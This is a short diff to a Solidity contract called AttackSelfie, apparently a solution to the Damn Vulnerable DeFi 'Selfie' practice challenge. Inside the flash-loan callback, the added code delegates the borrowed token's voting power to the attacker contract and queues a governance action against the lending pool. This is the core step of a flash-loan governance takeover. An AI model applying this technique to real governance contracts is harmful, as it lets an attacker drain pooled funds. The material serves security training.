@@ -35,6 +35,14 @@ contract AttackSelfie is IERC3156FlashBorrower {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
+
         damnValuableToken.delegate(address(this));
+
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            data
+        );
+        actionId = _actionId;
     }
 }
